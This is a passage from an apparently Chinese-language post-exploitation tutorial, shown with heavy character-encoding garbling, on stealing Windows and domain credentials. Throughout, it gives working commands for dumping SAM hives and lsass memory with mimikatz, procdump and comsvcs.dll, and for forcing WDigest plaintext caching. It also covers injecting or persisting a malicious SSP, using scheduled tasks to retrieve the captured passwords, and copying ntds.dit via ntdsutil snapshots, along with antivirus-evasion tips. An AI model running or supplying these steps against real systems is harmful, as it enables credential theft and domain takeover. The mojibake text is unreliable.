<p>-last â€œç”¨æˆ·åâ€ æ˜¾ç¤ºè¯¥ç‰¹å®šç”¨æˆ·æœ€åç™»å½•çš„è®¡ç®—æœº</p>
<h2 id="å¯†ç è·å–"><a href="#å¯†ç è·å–" class="headerlink" title="å¯†ç è·å–"></a>å¯†ç è·å–</h2><p>è½¬å‚¨è¯»å–çš„æ„æ€å°±æ˜¯ï¼Œå°† SAM æ–‡ä»¶è½¬å‚¨åˆ°æˆ‘ä»¬è‡ªå·±çš„ç”µè„‘ä¸Šç„¶åä½¿ç”¨å·¥å…·è¯»å–<br>åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥èº²é¿æ€è½¯</p>
<p>å¯¼å‡º SAM æ–‡ä»¶ï¼š<br><img src="https://i.imgur.com/hKYm43g.png"><br>reg å‘½ä»¤ï¼š</p>
<ul>
<li>reg save hklm\sam sam.hive</li>
<li>reg save hklm\system system.hive (è§£å¼€ sam æ–‡ä»¶çš„å¯†é’¥ä¹Ÿéœ€è¦å¯¼å‡º)<br>åç»­system.hiveä»¥ç›¸åŒæ–¹å¼æ‰§è¡Œ</li>
</ul>
<p><img src="https://i.imgur.com/DI9YStV.png"><br>csæ“ä½œä¸‹è½½ï¼Œç„¶åä¸‹ä¹‹ååˆ°csçš„æœåŠ¡å™¨ç«¯æŸ¥çœ‹ï¼Œè¿™é‡Œæ˜¯è™šæ‹Ÿæœºç¯å¢ƒï¼Œå°†å…¶ä¸­çš„æ–‡ä»¶æ‹¿å‡ºæ¥é‡åä¸ºsam.hiveå’Œsys.hive(è¿™é‡Œæ³¨æ„ä¸è¦å¼„æ··äº†)</p>
<p>æœ¬åœ°è§£å¯†æ“ä½œ<br><img src="https://i.imgur.com/yuG4KbE.png" alt="xx|450x250"><br>ç§»åŠ¨åˆ°æœ¬æœºmimikatzç›®å½•æ‰§è¡Œå‘½ä»¤è§£å¯†</p>
<ul>
<li>lsadump::sam &#x2F;sam:sam.hive &#x2F;system:sys.hive</li>
</ul>
<p>è½¬å‚¨è¯»å–çš„æ„æ€å°±æ˜¯ï¼Œå°† SAM æ–‡ä»¶è½¬å‚¨åˆ°æˆ‘ä»¬è‡ªå·±çš„ç”µè„‘ä¸Šç„¶åä½¿ç”¨å·¥å…·è¯»å–ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥èº²é¿æ€è½¯</p>
<h3 id="è¯»å–-lsass-è¿›ç¨‹å†…å­˜å¯†ç "><a href="#è¯»å–-lsass-è¿›ç¨‹å†…å­˜å¯†ç " class="headerlink" title="è¯»å– lsass è¿›ç¨‹å†…å­˜å¯†ç "></a>è¯»å– lsass è¿›ç¨‹å†…å­˜å¯†ç </h3><p>ä½¿ç”¨å·¥å…·ç›´æ¥è¯»å– lsass è¿›ç¨‹ä¸­çš„æ˜æ–‡å¯†ç ï¼Œå·¥å…·å¯èƒ½è¢«æ€ã€‚privilege:debug</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa:msv è·å– HASH(LM,NTLM)</span><br><span class="line"></span><br><span class="line">sekurlsa:wdigest é€šè¿‡å¯é€†çš„æ–¹å¼å»å†…å­˜ä¸­è¯»å–æ˜æ–‡å¯†ç </span><br><span class="line"></span><br><span class="line">sekurlsa:Kerberos è·å–åŸŸç®¡ç†å‘˜çš„æ˜æ–‡å¯†ç </span><br><span class="line"></span><br><span class="line">sekurlsa::tspkg é€šè¿‡ tspkg è¯»å–æ˜æ–‡å¯†ç </span><br><span class="line"></span><br><span class="line">sekurlsa:livessp é€šè¿‡ livessp è¯»å–æ˜æ–‡å¯†ç </span><br><span class="line"></span><br><span class="line">sekurlsa:ssp é€šè¿‡ ssp è¯»å–æ˜æ–‡å¯†ç </span><br><span class="line"></span><br><span class="line">sekurlsa:logonPasswords é€šè¿‡ä»¥ä¸Šå„ç§æ–¹æ³•è¯»å–æ˜æ–‡å¯†ç </span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/dS847Ty.gif"></p>
<h3 id="è½¬å‚¨"><a href="#è½¬å‚¨" class="headerlink" title="è½¬å‚¨"></a>è½¬å‚¨</h3><p>å°† Isass å†…å­˜å¯¼å‡ºï¼Œåœ¨æœ¬åœ°è¯»å– Isass å†…å­˜ä¸­çš„æ˜æ–‡è´¦å·å¯†ç ã€‚</p>
<p>è½¬å‚¨å†…å­˜æ–¹å¼æœ‰å¾ˆå¤šï¼š</p>
<p>1ã€ä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨ç›´æ¥è½¬å‚¨</p>
<p>å‰ææ˜¯èƒ½è¿œç¨‹æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ï¼Œéšåæ‰¾åˆ° lsass è¿›ç¨‹å³é”®è½¬å‚¨å³å¯ã€‚</p>
<p>2ã€procdump</p>
<p>ä½¿ç”¨ procdump å¯¼å‡º Isass.dmp æ–‡ä»¶ï¼Œæ€è½¯æ¯”è¾ƒå‹å¥½ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/nuqXfpn.png"></p>
<p>ä½¿ç”¨mimikatzä»è½¬å‚¨çš„lsass.dmpä¸­æ¥è¯»å–æ˜æ–‡å¯†ç </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span></span><br></pre></td></tr></table></figure>

<p>![[..&#x2F;é™„ä»¶ç®¡ç†&#x2F;åŠ¨ç”»26 1.gif]]</p>
<p>3ã€Out-MiniDump.ps1<br>é¡¹ç›®åœ°å€-<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">PowerShellMafia&#x2F;PowerSploit: PowerSploit - A PowerShell Post-Exploitation Framework</a></p>
<p>è¿™é‡Œä»…ä½¿ç”¨å…¶ä¸­ä¸€ä¸ª ps è„šæœ¬ï¼Œç”¨æ³•å¦‚ä¸‹:</p>
<ul>
<li>powershell-import Out-MiniDump.ps1</li>
<li>powershell Get-Process lsass | Out-MiniDump<br><img src="https://i.imgur.com/HRWPYPn.png"></li>
</ul>
<p>4ã€comsvcs.dll</p>
<p>Windows è‡ªå¸¦çš„åŠ¨æ€é“¾æ¥åº“ï¼Œå¯é€šè¿‡å…¶å‡½æ•° MiniDump å®ç° dump å†…å­˜</p>
<p>ä½¿ç”¨æ–¹æ³•ï¼š</p>
<p>æŸ¥çœ‹è¿›ç¨‹ pid:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr lsass.exe</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ powershell å¯¼å‡º:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 C:\Windows\system32\comsvcs.dll,MiniDump 488 C:\lsass.dmp full</span><br></pre></td></tr></table></figure>

<p>è¯»å–æ˜æ–‡å¯†ç ä¾æ—§ä½¿ç”¨ mimikatzï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::minidump æ–‡ä»¶å&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!NOTE] æ³¨æ„<br>æŸäº› AV å¯èƒ½ä¼šå°†ä½¿ç”¨ procdump.exe è½¬å‚¨ lsass.exe çš„è¡Œä¸ºæ£€æµ‹ä¸ºæ¶æ„è¡Œä¸ºï¼Œè¿™æ˜¯å› ä¸ºå®ƒä»¬æ£€æµ‹åˆ°äº†å­—ç¬¦ä¸²â€œprocdump.exeâ€å’Œâ€œlsass.exeâ€ã€‚å› æ­¤ï¼Œå°† lsass.exe çš„ PID ä½œä¸ºå‚æ•°ä¼ é€’ç»™ procdump æ¯”å°†åç§° lsass.exe ä½œä¸ºå‚æ•°ä¼ é€’æ›´ä¸ºéšè”½</p>
</blockquote>
<h3 id="é«˜ç‰ˆæœ¬å¯†ç æŠ“å–"><a href="#é«˜ç‰ˆæœ¬å¯†ç æŠ“å–" class="headerlink" title="é«˜ç‰ˆæœ¬å¯†ç æŠ“å–"></a>é«˜ç‰ˆæœ¬å¯†ç æŠ“å–</h3><p>Win7 å’Œ Win2008 è¿™æ ·çš„æœºå™¨ä¸­ä¼šå­˜å‚¨æ˜æ–‡å¯†ç è‡³å†…å­˜ä¸­ï¼Œä½†æ˜¯åœ¨ WS2012 ä¹‹åçš„(win8&#x2F;10&#x2F;11,WS2012&#x2F;2016)æˆ–è€…å®‰è£…äº†è¡¥ä¸ KB2971997 è¡¥ä¸çš„æœºå™¨ä¸­å†…å­˜ä¸­ä¸å†å­˜å‚¨æ˜æ–‡å¯†ç ï¼Œæ— æ³•é€šè¿‡ä¸Šè¿°æ‰‹æ®µæŠ“å–æ˜æ–‡å¯†ç ã€‚</p>
<p><img src="https://i.imgur.com/4NMr876.png"></p>
<h3 id="ä¿®æ”¹-Wdigest-æ³¨å†Œè¡¨"><a href="#ä¿®æ”¹-Wdigest-æ³¨å†Œè¡¨" class="headerlink" title="ä¿®æ”¹ Wdigest æ³¨å†Œè¡¨"></a>ä¿®æ”¹ Wdigest æ³¨å†Œè¡¨</h3><p>åœ¨ Windows2012 ç³»ç»ŸåŠä»¥ä¸Šçš„ç³»ç»Ÿï¼Œé»˜è®¤åœ¨å†…å­˜ç¼“å­˜ä¸­ç¦æ­¢ä¿å­˜æ˜æ–‡å¯†ç çš„ã€‚å¯ä»¥&#x3D;&#x3D;é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼æŠ“å–æ˜æ–‡&#x3D;&#x3D;ï¼Œéœ€è¦&#x3D;&#x3D;ç”¨æˆ·é‡æ–°ç™»å½•åæ‰èƒ½æˆåŠŸæŠ“å–&#x3D;&#x3D;ã€‚</p>
<p>æŸ¥è¯¢æ˜¯å¦å­˜åœ¨è¯¥å€¼ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸å­˜åœ¨ UseLogonCredential å€¼</p>
<p><img src="https://i.imgur.com/8A2TJoz.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&quot; /V UseLogonCredential</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/B9FtUiz.png" alt="x|900x250"></p>
<p>ä½¿ç”¨æœ€é«˜ç®¡ç†å‘˜æƒé™æ·»åŠ  UseLogonCredential å¹¶èµ‹å€¼ä¸º 1ï¼Œä½¿å†…å­˜ä¸­ä¿å­˜æ˜æ–‡å¯†ç :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/wL2qzTd.png" alt="x|900x150"><br>æ·»åŠ è¯¥å€¼å¹¶ä¸”èµ‹å€¼ä¸º 1ï¼Œå¦‚ä¸‹æ•ˆæœå³å¯ã€‚<br><img src="https://i.imgur.com/GUdSRnQ.png"></p>
<p>ç°åœ¨å†…å­˜ä¸­ä¼šä¿å­˜æ˜æ–‡å¯†ç äº†ï¼Œä½†æ˜¯å½“å‰å†…å­˜ä¸­æ²¡æœ‰ï¼Œéœ€è¦é”å±æˆ–è€…æ³¨é”€ç”¨æˆ·ï¼Œè®©ç”¨æˆ·é‡æ–°ç™»é™†ä¹‹åæ‰æœ‰ã€‚</p>
<p>é”å±(ç”¨è¿™ç§æ–¹å¼æŠ“ä¸åˆ° win10 çš„å¯†ç  æœ€å¥½æ³¨é”€ç”¨æˆ·)ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢åœ¨çº¿ç”¨æˆ·:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quser</span><br></pre></td></tr></table></figure>

<p>æ³¨é”€ç”¨æˆ·:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logoff ID</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå†æ¬¡ç™»å½•å†æŸ¥è¯¢<br><img src="https://i.imgur.com/MmmDM5l.png"></p>
<p>å…³é—­:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>

<h3 id="å†…å­˜æ³¨å…¥-SSP"><a href="#å†…å­˜æ³¨å…¥-SSP" class="headerlink" title="å†…å­˜æ³¨å…¥ SSP"></a>å†…å­˜æ³¨å…¥ SSP</h3><p>Mimikatz ä¸­ï¼Œæœ‰å†™å¥½çš„æ¶æ„çš„ SSP,å¯ä»¥æä¾›æœ¬åœ°è®¤è¯æ—¶å€™å¯¹æ˜æ–‡è´¦å·å¯†ç è¿›è¡Œè®°å½•ï¼Œåªéœ€è¦å°† SSP æ³¨å…¥åˆ°ç³»ç»Ÿå†…å­˜ä¸­ï¼Œå°±å¯ä»¥è·å–æœ¬åœ°çš„æ˜æ–‡è´¦å·å¯†ç ï¼Œå› ä¸ºæ˜¯æ³¨å…¥å†…å­˜æ‰€ä»¥é‡å¯åå°±å¤±æ•ˆäº†ï¼Œè¿™ä¸ªæ”»å‡»ä¹Ÿå« SSP æ³¨å…¥ã€‚</p>
<p>æ–¹æ³• 1ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz:</span><br><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/fYAAgEm.png"></p>
<p>æ–¹æ³• 2:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\InvokeMimikatz.ps1</span><br><span class="line"></span><br><span class="line">Invoke-Mimikatz-Command &quot;misc::memssp&quot;</span><br></pre></td></tr></table></figure>

<p>åŒæ ·éœ€è¦æ³¨é”€ç”¨æˆ·ã€‚ç”¨æˆ·é‡æ–°ç™»å½•ä¹‹ååœ¨ C:\System32\ ç›®å½•ä¸‹ä¼šå­˜åœ¨ mimilsa.log æ–‡ä»¶ï¼Œè®°å½•æ˜æ–‡å¯†ç ã€‚åœ¨ CS ä¸Šå¯èƒ½ä¼šæ²¡æœ‰æƒé™æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶(system ä¹Ÿæ²¡ç”¨),æ­¤æ—¶éœ€è¦ä½¿ç”¨è®¡åˆ’ä»»åŠ¡å°†è¯¥æ–‡ä»¶,æ¢ä¸ªä½ç½®ï¼Œæˆ–è€…å‘é€åˆ° VPSã€‚</p>
<p>åˆ›å»º bat æ–‡ä»¶ï¼Œç”¨äºå¤åˆ¶æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell echo copy C:\Windows\System32\mimilsa.log C:\Users\Administrator\Desktop\1.txt &gt;1.bat</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/arYznKP.png"></p>
<p>åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œæ‰§è¡Œ bat æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /create /tn copy /sc onstart /tr C:\Users\Administrator\Desktop\1.bat /ru system /f</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/Z8zrS0T.png"></p>
<p>è¿è¡Œè®¡åˆ’ä»»åŠ¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /run /i /tn &quot;copy&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/HgdZwSf.png"></p>
<p>ä¸€å®šè¦åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œç›´æ¥åœ¨ CS è¿è¡Œè¿™ä¸ª bat æ–‡ä»¶ä¸è¡Œã€‚</p>
<h3 id="æ³¨å†Œè¡¨æ·»åŠ -SSP"><a href="#æ³¨å†Œè¡¨æ·»åŠ -SSP" class="headerlink" title="æ³¨å†Œè¡¨æ·»åŠ  SSP"></a>æ³¨å†Œè¡¨æ·»åŠ  SSP</h3><p>SSP æ³¨å…¥åˆ°å†…å­˜ä¸­ï¼Œæœ‰ä¸€ä¸ªå¼Šç«¯å°±æ˜¯åœ¨å†…å­˜ä¸­ï¼Œåªè¦ç”µè„‘é‡å¯äº†å°±ä¼šå¤±æ•ˆï¼Œå¦‚æœæƒ³è¦æ°¸ä¹…ç”Ÿæ•ˆå°±éœ€è¦å°† SSP æ·»åŠ åˆ°æ³¨å†Œè¡¨ä¸­ï¼Œä¹‹åç³»ç»Ÿé‡å¯å°±ä¼šåŠ è½½ SSP,è¿™æ ·å°±ä¼šè·å–æ˜æ–‡è´¦å·å¯†ç ã€‚</p>
<p>1ã€åœ¨ Mimikatz ä¸­æœ‰ä¸€ä¸ª mimilib.dll æ–‡ä»¶ï¼Œè¿™ä¸ªå°±æ˜¯ SSPï¼Œå°†è¿™ä¸ªæ–‡ä»¶å¤åˆ¶åˆ° C:\Windows\System32 ç›®å½•ä¸‹</p>
<p>2ã€ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œä½¿å¾—é‡æ–°å¯åŠ¨æ—¶åŠ è½½ SSP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v &quot;Security Packages&quot; /t REG_MULTI_SZ /d mimilib.dll /f</span><br></pre></td></tr></table></figure>

<p>3ã€å¯†ç å°†ä¼šç”Ÿæˆåœ¨ C:\Windows\System32\kiwissp.log</p>
<p>å°é—®é¢˜:è¿™ä¸ª dll ä¼šè¢«æ€è½¯æ€æ‰</p>
<h1 id="åŸŸæ§å¯†ç æŠ“å–"><a href="#åŸŸæ§å¯†ç æŠ“å–" class="headerlink" title="åŸŸæ§å¯†ç æŠ“å–"></a>åŸŸæ§å¯†ç æŠ“å–</h1><h2 id="NTDS-æ–‡ä»¶ä»‹ç»"><a href="#NTDS-æ–‡ä»¶ä»‹ç»" class="headerlink" title="NTDS æ–‡ä»¶ä»‹ç»"></a>NTDS æ–‡ä»¶ä»‹ç»</h2><p>Active Directory ç›®å½•æœåŠ¡ä½¿ç”¨æ•°æ®å­˜å‚¨æ¥å­˜å‚¨æ‰€æœ‰ç›®å½•ä¿¡æ¯ã€‚æ­¤æ•°æ®å­˜å‚¨é€šå¸¸ç§°ä¸ºç›®å½•ã€‚ç›®å½•åŒ…å«æœ‰å…³ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€åŸŸã€ç»„ç»‡å•ä½å’Œå®‰å…¨ç­–ç•¥ç­‰å¯¹è±¡çš„ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥å‘å¸ƒä»¥ä¾›ç”¨æˆ·å’Œç®¡ç†å‘˜ä½¿ç”¨ã€‚</p>
<p>ç›®å½•å­˜å‚¨åœ¨åŸŸæ§åˆ¶å™¨ä¸Šï¼Œå¯ä»¥ç”±ç½‘ç»œåº”ç”¨ç¨‹åºæˆ–æœåŠ¡è®¿é—®ã€‚ä¸€ä¸ªåŸŸå¯ä»¥æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªåŸŸæ§åˆ¶å™¨ã€‚æ¯ä¸ªåŸŸæ§åˆ¶å™¨éƒ½æœ‰å…¶æ‰€åœ¨æ•´ä¸ªåŸŸçš„ç›®å½•å‰¯æœ¬ã€‚å¯¹ä¸€ä¸ªåŸŸæ§åˆ¶å™¨ä¸Šçš„ç›®å½•æ‰€åšçš„æ›´æ”¹å°†å¤åˆ¶åˆ°åŸŸã€åŸŸæ ‘æˆ–æ—ä¸­çš„å…¶ä»–åŸŸæ§åˆ¶å™¨ã€‚Active Directory ä½¿ç”¨å››ç§ä¸åŒçš„ç›®å½•åˆ†åŒºç±»å‹æ¥å­˜å‚¨å’Œå¤åˆ¶ä¸åŒç±»å‹çš„æ•°æ®ã€‚ç›®å½•åˆ†åŒºåŒ…å«åŸŸã€é…ç½®ã€æ¶æ„å’Œåº”ç”¨ç¨‹åºæ•°æ®ã€‚æ­¤å­˜å‚¨å’Œå¤åˆ¶è®¾è®¡ä¸ºæ•´ä¸ªåŸŸä¸­çš„ç”¨æˆ·å’Œç®¡ç†å‘˜æä¾›ç›®å½•ä¿¡æ¯ã€‚</p>
<p>ç›®å½•æ•°æ®å­˜å‚¨åœ¨åŸŸæ§åˆ¶å™¨ä¸Šçš„ Ntds.dit æ–‡ä»¶ä¸­ã€‚å»ºè®®å°†æ­¤æ–‡ä»¶å­˜å‚¨åœ¨ NTFS åˆ†åŒºä¸Šã€‚æœ‰å…³ç”¨äºç®¡ç† Active Directory æ•°æ®åº“å’Œæ—¥å¿—æ–‡ä»¶çš„å·¥å…·çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…Ntdsutil ä¸­çš„æ–‡ä»¶ã€‚ç§æœ‰æ•°æ®ä»¥å®‰å…¨æ–¹å¼å­˜å‚¨ï¼Œå…¬å…±ç›®å½•æ•°æ®å­˜å‚¨åœ¨å…±äº«ç³»ç»Ÿå·ä¸Šï¼Œå¯ä»ä¸­å¤åˆ¶åˆ°åŸŸä¸­çš„å…¶ä»–åŸŸæ§åˆ¶å™¨ã€‚æœ‰å…³å¤åˆ¶çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…å¤åˆ¶æ¦‚è¿°ã€‚åŸŸæ§ä¸Šçš„ ntds.dit åªæœ‰å¯ä»¥ç™»å½•åˆ°åŸŸæ§çš„ç”¨æˆ·ï¼ˆå¦‚åŸŸç®¡ç”¨æˆ·ã€DC æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·ï¼‰å¯ä»¥è®¿é—®ï¼Œä¸ºäº†è¿›ä¸€æ­¥ä¿æŠ¤å¯†ç å“ˆå¸Œå€¼ï¼Œä½¿ç”¨å­˜å‚¨åœ¨ SYSTEM æ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­çš„å¯†é’¥å¯¹è¿™äº›å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†ã€‚<br>è¯¥æ–‡ä»¶çš„ä½ç½®:C:ï¼ˆåŸŸæ§ä¸Šæ‰æœ‰è¿™ä¸ªæ–‡ä»¶å¤¹ï¼‰</p>
<h3 id="å·å½±æ‹·è´æå–åŸŸæ§-NTDS"><a href="#å·å½±æ‹·è´æå–åŸŸæ§-NTDS" class="headerlink" title="å·å½±æ‹·è´æå–åŸŸæ§ NTDS"></a>å·å½±æ‹·è´æå–åŸŸæ§ NTDS</h3><p>ä» Windows XP SP2 å’Œ Windows Server2003 å¼€å§‹ï¼Œå¾®è½¯å°±å‘ Windows æ“ä½œç³»ç»Ÿä¸­å¼•å…¥äº†ä¸€é¡¹åå«å·å½±æ‹·è´çš„æœåŠ¡(Volume Shadow Copy Service-VSS)ã€‚</p>
<p>è¿™ç§æœåŠ¡å…è®¸ Windows ç³»ç»Ÿä»¥è‡ªåŠ¨æˆ–æ‰‹åŠ¨çš„æ–¹å¼å¯¹æ–‡ä»¶æˆ–ç£ç›˜å·å®—çš„å½“å‰çŠ¶æ€è¿›è¡Œå¤‡ä»½ï¼ˆæˆ–å¿«ç…§ï¼‰ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œ&#x3D;&#x3D;å³ä½¿æ–‡ä»¶å¤„äºæ‰“å¼€çŠ¶æ€ä¸‹<br>è¯¥æœåŠ¡ä»ç„¶å¯ä»¥ç›´æ¥è¿›è¡Œæ–‡ä»¶å¤‡ä»½&#x3D;&#x3D;ï¼Œ</p>
<p>Ntds.dit æ˜¯é»˜è®¤è¢« Windows ç³»ç»Ÿé”å®šçš„ï¼Œæƒ³è¦è¯»å–è¯¥æ–‡ä»¶å°±è¦åˆ©ç”¨å·å½±æ‹·è´æœåŠ¡(Volume Shadow Copy Service,VSS),å¾—åˆ° Ntds.dit æ–‡ä»¶çš„å‰¯æœ¬ã€‚å·å½±æ‹·è´æœåŠ¡(VSS)æœ¬è´¨ä¸Šæ˜¯å±äºå¿«ç…§æŠ€æœ¯çš„ä¸€ç§ä¸»è¦ç”¨äºå¤‡ä»½å’Œæ¢å¤ï¼Œå³ä½¿ç›®æ ‡æ–‡ä»¶è¢«å¤„äºé”å®šçŠ¶æ€ã€‚</p>
<p>æ–¹å¼ä¸€:ntdlutils.exe</p>
<p>ntdsutil..exe æ˜¯ä¸€ä¸ªä¸ºæ´»åŠ¨ç›®å½•æä¾›ç®¡ç†æœºåˆ¶çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè¯¥å·¥å…·é»˜è®¤å®‰è£…åœ¨åŸŸæ§æœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥åœ¨åŸŸæ§åˆ¶å™¨ä¸Šç›´æ¥æ“ä½œï¼Œ2003ã€2008ã€2012ã€2016 ç­‰ï¼Œæå– NTDS è¿‡ç¨‹åˆ†ä¸º 3 æ­¥ã€‚å¦‚æœä½¿ç”¨ CSï¼Œå¿…é¡»æœ‰ SYSTEM æƒé™ã€‚</p>
<p>åˆ›å»ºå¿«ç…§:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q q</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/2QQpneO.png"></p>
<p>åŠ è½½å¿«ç…§åˆ°ç£ç›˜ä¸­:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe snapshot &quot;mount 26e87b74-3c6f-46ea-9994-c85f9cf93b42&quot; q q</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/zsjJUbn.png"></p>
<p>å¤åˆ¶ NTDS æ–‡ä»¶:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202411041725_VOLUMEC$\Windows\NTDS\ntds.dit C:\Users\kzh\Desktop\ntds.dit</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/UqlwhNV.png"></p>
<p>ç§»é™¤æŒ‚è½½ï¼Œåˆ é™¤å¿«ç…§:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe snapshot &quot;unmount &#123;26e87b74-3c6f-46ea-9994-c85f9cf93b42&#125;&quot; &quot;delete &#123;26e87b74-3c6f-46ea-9994-c85f9cf93b42&#125;&quot; q q</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/5paDsXN.png"></p>
<p>ç”Ÿæˆditæ–‡ä»¶<br><img src="https://i.imgur.com/OQfSBtx.png"></p>
<h3 id="ç¦»çº¿è¯»å–-NTDS"><a href="#ç¦»çº¿è¯»å–-NTDS" class="headerlink" title="ç¦»çº¿è¯»å– NTDS"></a>ç¦»çº¿è¯»å– NTDS</h3><p>é¦–å…ˆéœ€è¦ä¸‹è½½ NTDS æ–‡ä»¶ï¼Œè€Œä¸”è¿˜è¦è½¬å‚¨ system.hive,å’Œ sam æ–‡ä»¶ä¸€æ ·ï¼Œéœ€è¦ system.hive ä¸­çš„å¯†é’¥æ‰èƒ½è¯»å– NTDS æ–‡ä»¶ã€‚</p>
<p>reg save hklm\system1 c:\windows\temp\system.hive</p>
<p>æœ‰äº†è¿™ä¸¤ä¸ªæ–‡ä»¶ä¹‹åå°±å¯ä»¥ä½¿ç”¨å·¥å…·è¯»å–äº†ï¼š</p>
<p>secretsdump</p>
